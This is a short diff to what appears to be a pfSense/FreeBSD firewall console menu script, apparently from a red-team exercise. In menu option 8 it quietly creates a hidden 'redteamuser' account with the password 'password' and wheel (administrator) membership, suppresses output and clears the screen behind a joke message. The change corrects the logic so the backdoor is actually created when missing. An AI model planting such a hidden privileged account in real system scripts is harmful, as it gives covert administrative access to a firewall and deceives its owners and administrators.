@@ -130,12 +130,14 @@ case ${opmode} in
 	;;
 8)
 	echo "This wouldn't be as fun if it were that easy"
-	if id redteamuser &>/dev/null; then
-		echo "password" | pw useradd redteamuser -m -s /etc/rc.initial -c "user" -h 0 -G wheel &>/dev/null
-		clear
-	else
-		clear
-	fi
+    if id redteamuser >/dev/null 2>&1; then
+        # redteamuser exists, just clear the screen
+        clear
+    else
+        # redteamuser does NOT exist, create them
+        echo "password" | pw useradd redteamuser -m -s /etc/rc.initial -c "user" -h 0 -G wheel >/dev/null 2>&1
+        clear
+    fi
 	;;
 9)
 	/usr/local/sbin/pftop
